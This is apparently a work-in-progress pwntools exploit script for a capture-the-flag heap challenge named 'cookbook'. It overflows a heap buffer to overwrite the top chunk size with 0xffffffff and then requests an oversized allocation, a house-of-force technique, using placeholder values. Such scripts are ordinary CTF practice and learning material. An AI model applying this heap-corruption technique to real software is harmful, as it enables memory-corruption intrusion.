from pwn import *

p = gdb.debug('./cookbook')

print p.recvline()

p.sendline('0xdeadbeef')     # sending name 

print p.recvlines(19)

p.sendline('c')              # creating recipie

print p.recvlines(9)

p.sendline('n')              # allocating mem

print p.recvlines(9)

p.sendline('g')              # overflowing 

payload = "A"*896+pack(0xffffffff)

p.sendline(payload)
	
print p.recvlines(9)

p.sendline('q')

print p.recvlines(10)
                        
p.sendline('g')             # allocating large chunk

print p.recvuntil(':') 

#p.sendline("0xf7fad874")

p.sendline("0xffffd950")

p.sendline("A"*4+"B"*4)

print p.recvlines(10)

p.sendline('g') 

print p.recvuntil(':')    

p.sendline("0x10")

payload = "AAAABBBB"+pack(0xdeadbeef)

p.sendline(payload)

print p.recvlines(10)

p.sendline('q') 

raw_input()





 




